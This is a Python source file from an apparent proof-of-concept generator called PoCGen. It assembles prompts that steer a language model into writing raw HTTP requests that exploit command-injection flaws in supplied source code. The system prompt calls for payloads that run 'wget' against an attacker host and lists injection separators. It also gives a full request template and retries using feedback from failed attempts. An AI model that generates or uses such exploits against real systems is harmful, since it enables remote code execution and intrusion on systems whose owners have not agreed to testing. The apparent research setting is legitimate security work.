from __future__ import annotations

from typing import List, Optional

from PoCGen.llm.client import ChatMessage
from PoCGen.config.config import SETTINGS


def _build_system_prompt(attacker_url: str) -> str:
    return (
        "You are a security researcher generating ONE raw HTTP request PoC for a command injection vulnerability.\n"
        "Given several source files and a short vulnerability description, output EXACTLY ONE raw HTTP request that could exploit the issue.\n"
        f"Objective: use a command-injection payload that fetches 'testpoc' from the attacker host '{attacker_url}' via wget. The attacker URL represents the file retrieval location; infer the vulnerable parameter and request structure from the provided code and description.\n"
        "\n"
        "Blueprint handling:\n"
        "- If a sample HTTP interaction is provided, treat it as the primary blueprint—mirror its method, path, critical headers, parameter naming, and encoding, only changing what is necessary to deliver the payload.\n"
        "- If validation feedback from previous attempts is provided, you MUST fix the highlighted issues (e.g., wrong parameter, missing cookie, incorrect length) before responding.\n"
        "\n"
        "Silent chain-of-thought (keep internal; final output is ONLY the raw HTTP request):\n"
        "  1) Infer method/path, body format, and vulnerable parameter from code/sample.\n"
        "  2) Craft the minimal injection payload to wget the attacker URL, matching encoding and delimiters.\n"
        "  3) Assemble headers/body, then recompute accurate Content-Length.\n"
        "\n"
        "Refinement guidance after a failure: revisit the BODY format first—match parameter names, required fields, encoding style (JSON, form-urlencoded, plaintext, multipart), and payload syntax from the vulnerable code before adjusting headers or ancillary metadata. Mirror any command-injection delimiters such as '$(...)', '$(+ ...)', ';', '&&', or backticks that the backend recognizes.\n"
        "\n"
        "Hard constraints (follow strictly):\n"
        "- Output MUST be exactly one HTTP request, no explanations, no extra lines, no markdown, no code fences.\n"
        "- The single request MUST include both headers and body (data).\n"
        "- Derive the HTTP method and media type from the sample or code. If JSON, send a compact JSON body; if form data, keep it URL-encoded; if plaintext or multipart, follow that format exactly. Only fall back to POST with 'application/x-www-form-urlencoded; charset=UTF-8' when the handler's expectations are unknown.\n"
        "- Include realistic headers similar to: User-Agent, Accept, Accept-Language, Accept-Encoding, Content-Type, X-Requested-With, Origin, Connection, Referer, Cookie (if applicable).\n"
        "- Host header must reflect the known target; if unknown, use 'Host: TARGET'. If a Target Hint is provided, use its host:port, and mirror it in Origin/Referer.\n"
        f"- Body should contain a minimal injection payload using separators like ';' or '&&' to trigger command execution, referencing a plausible vulnerable parameter. The payload's purpose is to run 'wget {attacker_url}'.\n"
        "- Content-Length MUST be the exact UTF-8 byte length of the body. Determine it AFTER finalizing the exact body content (including any trailing newline if present). Do not guess.\n"
        f"- IMPORTANT: The attacker URL in the body MUST be plaintext (NOT percent-encoded). Do NOT URL-encode the '{attacker_url}' or the separators ';'/'&&'. If credentials/cookies are needed, include a realistic placeholder cookie, e.g., 'Cookie: Authorization=REPLACE_ME'.\n"
        "\n"
        "Fallback structure if no sample interaction is available (adjust as needed):\n"
        "  POST /path/to/vuln HTTP/1.1\n"
        "  Host: <HOST>\n"
        "  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\n"
        "  Accept: application/json, text/javascript, */*; q=0.01\n"
        "  Accept-Language: en-US,en;q=0.5\n"
        "  Accept-Encoding: gzip, deflate, br\n"
        "  Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n"
        "  X-Requested-With: XMLHttpRequest\n"
        "  Content-Length: <LEN>\n"
        "  Origin: http://<HOST>\n"
        "  Connection: keep-alive\n"
        "  Referer: http://<HOST>/\n"
        "  Cookie: <COOKIE_IF_NEEDED>\n"
        "  \n"
        "  <BODY_WITH_INJECTION>\n"
    )


def build_prompt_command_injection_http(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    attacker_url: Optional[str] = None,
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    atk = attacker_url or SETTINGS.attacker_url
    user_parts: List[str] = []
    user_parts.append("Vulnerability Description:\n" + description.strip())
    if target:
        user_parts.append(f"Target Hint: {target}")
    if target_profile:
        user_parts.append(target_profile)
    if validation_feedback:
        user_parts.append(
            "Previous attempt feedback (use this to refine the next request):\n" + validation_feedback.strip()
        )
    for idx, content in enumerate(code_files, start=1):
        user_parts.append(f"--- Code File #{idx} ---\n{content}")

    user = "\n\n".join(user_parts)
    # LLM input assembly: system prompt + user context/messages
    return [
        ChatMessage(role="system", content=_build_system_prompt(atk)),
        ChatMessage(role="user", content=user),
    ]


__all__ = ["build_prompt_command_injection_http"]
